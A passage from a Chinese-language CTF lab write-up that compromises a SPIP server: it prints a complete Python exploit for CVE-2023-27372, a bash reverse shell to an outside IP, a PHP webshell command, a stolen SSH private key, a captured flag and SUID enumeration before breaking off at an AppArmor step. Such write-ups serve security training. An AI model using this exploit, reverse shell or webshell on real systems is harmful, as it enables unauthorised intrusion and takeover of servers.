class="hljs-number">2023-02-27       </span><span class="hljs-string">excellent</span>  <span class="hljs-literal">Yes</span>    <span class="hljs-string">SPIP</span> <span class="hljs-string">form</span> <span class="hljs-string">PHP</span> <span class="hljs-string">Injection</span><br>   <span class="hljs-number">13</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">PHP</span> <span class="hljs-string">In-Memory</span>                       <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">14</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Unix/Linux</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>            <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br>   <span class="hljs-number">15</span>    <span class="hljs-string">\_</span> <span class="hljs-attr">target:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Command</span> <span class="hljs-string">Shell</span>               <span class="hljs-string">.</span>                <span class="hljs-string">.</span>          <span class="hljs-string">.</span>      <span class="hljs-string">.</span><br><br><br><span class="hljs-string">Interact</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">by</span> <span class="hljs-string">name</span> <span class="hljs-string">or</span> <span class="hljs-string">index.</span> <span class="hljs-string">For</span> <span class="hljs-string">example</span> <span class="hljs-string">info</span> <span class="hljs-number">15</span><span class="hljs-string">,</span> <span class="hljs-string">use</span> <span class="hljs-number">15</span> <span class="hljs-string">or</span> <span class="hljs-string">use</span> <span class="hljs-string">exploit/multi/http/spip_rce_form</span><br><span class="hljs-string">After</span> <span class="hljs-string">interacting</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">module</span> <span class="hljs-string">you</span> <span class="hljs-string">can</span> <span class="hljs-string">manually</span> <span class="hljs-string">set</span> <span class="hljs-string">a</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">with</span> <span class="hljs-string">set</span> <span class="hljs-string">TARGET</span> <span class="hljs-string">&#x27;Windows Command Shell&#x27;</span><br></code></pre></td></tr></table></figure><p>ç»“åˆé¢˜ç›®æè¿°æ¥çœ‹å¯èƒ½æ˜¯è¿™ä¸ª rce</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">12 </span> exploit/multi/http/spip_rce_form                 <span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>       excellent  Yes    SPIP form PHP Injection<br></code></pre></td></tr></table></figure><h2 id="CVE-2023-27372"><a href="#CVE-2023-27372" class="headerlink" title="CVE-2023-27372"></a>CVE-2023-27372</h2><p>æœäº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯æ‰“ <code>CVE-2023-27372</code>ï¼Œåˆ›å»ºä¸€ä¸ª <code>27372.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># Exploit Title: SPIP &lt; 4.2.1 - Remote Code Execution (Unauthenticated)</span><br><span class="hljs-comment"># Google Dork: inurl:&quot;/spip.php?page=login&quot;</span><br><span class="hljs-comment"># Date: 19/06/2023</span><br><span class="hljs-comment"># Exploit Author: nuts7</span><br><span class="hljs-comment"># Vendor Homepage: https://www.spip.net/</span><br><span class="hljs-comment"># Software Link: https://files.spip.net/spip/archives/</span><br><span class="hljs-comment"># Version: &lt; 4.2.1 (Except few fixed versions indicated in the description)</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0</span><br><span class="hljs-comment"># CVE reference : CVE-2023-27372 (coiffeur)</span><br><span class="hljs-comment"># CVSS : 9.8 (Critical)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Vulnerability Description:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.</span><br><span class="hljs-comment"># This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Usage: python3 CVE-2023-27372.py http://example.com</span><br><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> bs4<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseArgs</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Poc of CVE-2023-27372 SPIP &lt; 4.2.1 - Remote Code Execution by nuts7&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SPIP application base URL&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;--command&quot;</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Command to execute&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, default=<span class="hljs-literal">False</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Verbose mode. (default: False)&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_anticsrf</span>(<span class="hljs-params">url</span>):<br>    r = requests.get(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, timeout=<span class="hljs-number">10</span>)<br>    soup = bs4.BeautifulSoup(r.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    csrf_input = soup.find(<span class="hljs-string">&#x27;input&#x27;</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;formulaire_action_args&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> csrf_input:<br>        csrf_value = csrf_input[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> options.verbose:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Anti-CSRF token found : %s&quot;</span> % csrf_value)<br>        <span class="hljs-keyword">return</span> csrf_value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unable to find Anti-CSRF token&quot;</span>)<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">url, payload</span>):<br>    data = &#123;<br>        <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;spip_pass&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action&quot;</span>: <span class="hljs-string">&quot;oubli&quot;</span>,<br>        <span class="hljs-string">&quot;formulaire_action_args&quot;</span>: csrf,<br>        <span class="hljs-string">&quot;oubli&quot;</span>: payload<br>    &#125;<br>    r = requests.post(<span class="hljs-string">&#x27;%s/spip.php?page=spip_pass&#x27;</span> % url, data=data)<br>    <span class="hljs-keyword">if</span> options.verbose:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Execute this payload : %s&quot;</span> % payload)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    options = parseArgs()<br><br>    csrf = get_anticsrf(url=options.url)<br>    send_payload(url=options.url, payload=<span class="hljs-string">&quot;s:%s:\&quot;&lt;?php system(&#x27;%s&#x27;); ?&gt;\&quot;;&quot;</span> % (<span class="hljs-number">20</span> + <span class="hljs-built_in">len</span>(options.command), options.command))<br></code></pre></td></tr></table></figure><p>éšä¾¿å†™ä¸€ä¸ª <code>webshell.php</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">96</span>.<span class="hljs-number">254</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python  27372.py -u http://10.10.42.106/spip -c &#x27;echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(\<span class="hljs-variable">$_GET</span>[\<span class="hljs-string">&quot;cmd\&quot;]); ?&gt;</span></span><span class="language-xml">&quot; &gt; webshell.php&#x27; -v</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d89673d178a5cf4.png"></p><p>æŸ¥çœ‹æœ‰å“ªäº›ç”¨æˆ·ç›®å½•ï¼Œæœ‰ä¸€ä¸ª think ç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/df7b3bfcdf52a69e.png"></p><p>æŸ¥çœ‹ç”¨æˆ·ç›®å½•æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aae60656f929434.png"></p><p>è®¿é—®<code>/user.txt</code> æ‹¿åˆ°ç¬¬ä¸€ä¸ª user flag </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">fa229046d44eda6a3598c73ad96f4ca5  <br></code></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>å‘ç°æœ‰ <code>.ssh</code>ï¼Œè®¿é—® <code>/home/think/.ssh </code>æ‹¿åˆ°ç§é’¥</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs cmd">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK<br>uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+<span class="hljs-number">9</span>/<span class="hljs-number">2</span>ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc<br>OY8+<span class="hljs-number">1</span>CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx<br>SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+<span class="hljs-number">8</span>vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY<br>RYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv<br>+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV<br>QFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ<br>Tu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2<br>EAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG<br>qyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u<br><span class="hljs-number">8</span>uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc<br>cnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu<br><span class="hljs-number">8</span>yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId<br>eGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+<span class="hljs-number">9</span>SYFUBZDUMqlTOM<br>H+qDg0qkLLiL55AeZfXtPebCQ8M9aY/<span class="hljs-number">2</span>ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H<br>Ao4EkYcOBsv23yeJS8l/<span class="hljs-number">23</span>Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF<br>mTQHoxj3Jl3M8+Au+<span class="hljs-number">0</span>P+<span class="hljs-number">2</span>aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV<br>VxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5<br><span class="hljs-number">49</span>F0+<span class="hljs-number">4</span>+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV<br><span class="hljs-number">8</span>Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR<br>zz2F+<span class="hljs-number">3</span>dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW<br>xlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+<span class="hljs-number">0</span>nswZNAIDvKKIzzbqvBKZMfVZl4Q<br>UafNbJoLlXm+<span class="hljs-number">4</span>lshdBSRVHPe81IYS8C+<span class="hljs-number">1</span>foyX+f1HRkodpkGE0/<span class="hljs-number">4</span>/StcGv4XiRBFG1qQAA<br>AMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l<br>DbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE<br><span class="hljs-number">56</span>P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL<br>IHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV<br>ThENf8Iz+Y8LFcKLjnDwBdFkyE9kqNRT71xyZK8t5O2Ec0vCRiLeZU/DTAFPiR+B6WPfUb<br>kFX8AXaUXpJmUlTLl6on7mCpNnjjsRKJDUtFm0H6MOGD/YgYE4ZvruoHCmQaeNMpc3YSrG<br>vKrFIed5LNAJ3kLWk8SbzZxsuERbybIKGJa8Z9lYWtpPiHCsl1wqrFiB9ikfMa2DoWTuBh<br>+Xk2NGp6e98Bjtf7qtBn/<span class="hljs-number">0</span>rBfdZjveM1MAAADBANoC+jBOLbAHk2rKEvTY1Msbc8Nf2aXe<br>v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr<br>LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5<br>M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96<br>Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>ç»™ 600 æƒé™ï¼ˆæœ€å¼€å§‹è„‘å­æŠ½äº†ç›´æ¥ç»™çš„ 777ï¼Œåé¢æ‰æƒ³èµ·æ¥å®ƒçš„æƒé™æœ€å¤§æ‰ 600ï¼‰ï¼Œç”¨ ssh ç™»å½•</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ssh think@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span> -i id_rsa<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰è®¾ç½®äº† SUID çš„å¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">find</span> / -<span class="hljs-title">perm</span> -<span class="hljs-title">u</span>=<span class="hljs-title">s</span> -<span class="hljs-title">type</span> <span class="hljs-title">f</span> 2&gt;/<span class="hljs-title">dev</span>/<span class="hljs-title">null</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkit</span>-<span class="hljs-title">agent</span>-<span class="hljs-title">helper</span>-1</span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">eject</span>/<span class="hljs-title">dmcrypt</span>-<span class="hljs-title">get</span>-<span class="hljs-title">device</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">dbus</span>-1.0/<span class="hljs-title">dbus</span>-<span class="hljs-title">daemon</span>-<span class="hljs-title">launch</span>-<span class="hljs-title">helper</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">xorg</span>/<span class="hljs-title">Xorg.wrap</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">pppd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">run_container</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">at</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">fusermount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gpasswd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chfn</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">sudo</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chsh</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">passwd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">su</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">newgrp</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">pkexec</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">umount</span></span><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°äº†ä¸€ä¸ªä¸æ˜¯å…¸å‹çš„ SUID æ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/34ef96d874deacb2.png"></p><p>æŸ¥çœ‹æ–‡ä»¶å‘ç°æœ‰ä¸€å¥ <code>bin/bash -p /opt/run_container.sh</code>ï¼Œè¯´æ˜è¿™å°†æ‰§è¡Œ <code>/opt/run_container.sh</code> ï¼ŒæŸ¥çœ‹ <code>run_container.sh</code> å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Function to list Docker containers</span><br><span class="hljs-function"><span class="hljs-title">list_containers</span></span>() &#123;<br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-subst">$(docker ps -aq)</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;List of Docker containers:&quot;</span><br>    docker ps -a --format <span class="hljs-string">&quot;ID: &#123;&#123;.ID&#125;&#125; | Name: &#123;&#123;.Names&#125;&#125; | Status: &#123;&#123;.Status&#125;&#125;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to prompt user for container ID</span><br><span class="hljs-function"><span class="hljs-title">prompt_container_id</span></span>() &#123;<br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Enter the ID of the container or leave blank to create a new one: &quot;</span> container_id<br>    validate_container_id <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to display options and perform actions</span><br><span class="hljs-function"><span class="hljs-title">select_action</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;OPTIONS:&quot;</span><br>    <span class="hljs-built_in">local</span> container_id=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    PS3=<span class="hljs-string">&quot;Choose an action for a container: &quot;</span><br>    options=(<span class="hljs-string">&quot;Start Container&quot;</span> <span class="hljs-string">&quot;Stop Container&quot;</span> <span class="hljs-string">&quot;Restart Container&quot;</span> <span class="hljs-string">&quot;Create Container&quot;</span> <span class="hljs-string">&quot;Quit&quot;</span>)<br><br>    <span class="hljs-keyword">select</span> opt <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$REPLY</span> <span class="hljs-keyword">in</span><br>            1) docker start <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            2)  <span class="hljs-keyword">if</span> [ $(docker ps -q | <span class="hljs-built_in">wc</span> -l) -lt 2 ]; <span class="hljs-keyword">then</span><br>                    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;No enough containers are currently running.&quot;</span><br>                    <span class="hljs-built_in">exit</span> 1<br>                <span class="hljs-keyword">fi</span><br>                docker stop <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>                <span class="hljs-built_in">break</span> ;;<br>            3) docker restart <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            4) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Creating a new container...&quot;</span><br>               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest<br>               <span class="hljs-built_in">break</span> ;;<br>            5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exiting...&quot;</span>; <span class="hljs-built_in">exit</span> ;;<br>            *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid option. Please choose a valid option.&quot;</span> ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment"># Main script execution</span><br>list_containers<br>prompt_container_id  <span class="hljs-comment"># Get the container ID from prompt_container_id function</span><br>select_action <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>  <span class="hljs-comment"># Pass the container ID to select_action function</span><br></code></pre></td></tr></table></figure><p>å¿…é¡»ç»•è¿‡å½“å‰çš„ shell é™åˆ¶ï¼Œæ‰èƒ½é‡å†™ <code>run_container.sh</code>ã€‚å¹¶ä¸”åœ¨ <code>/opt</code> ç›®å½•ä¸‹ä¸èƒ½åˆ—å‡ºæ–‡ä»¶ï¼Œä½†æ˜¯ä½¿ç”¨<code>ls -al</code> æ˜¾ç¤ºçš„æ˜¯èƒ½å¤Ÿè¯»å–ç›®å½•çš„å†…å®¹çš„</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f55ad8d8e7b30b4.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p>å†å›æƒ³ä¸€ä¸‹é¢˜ç›®æè¿°ï¼Œâ€œnecessitating a deeper exploration into the systemâ€™s security profileâ€ï¼Œéœ€è¦å¯¹ç³»ç»Ÿçš„å®‰å…¨é…ç½®æ–‡ä»¶è¿›è¡Œæ›´æ·±å…¥çš„æ¢ç´¢</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 